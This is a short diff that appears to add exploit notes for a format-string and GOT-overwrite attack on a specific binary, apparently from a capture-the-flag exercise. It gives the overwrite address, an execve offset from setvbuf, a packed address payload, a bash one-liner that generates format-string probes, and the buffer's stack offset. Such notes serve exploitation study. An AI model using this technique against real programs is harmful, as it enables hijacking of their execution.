@@ -1,0 +1,8 @@
+GOT overwrite address = 0x00404018
+
+execve offset = (address of setvbuf) + 0x60600
+
+payload = "\x18\x40\x40\x00\x00\x00\x00\x00"
+
+# bash for generating format str to find buffer address: `for i in `seq 1 200`; do echo -n "%$i\$lx."; done`
+our buffer input is located at `%38$lx`
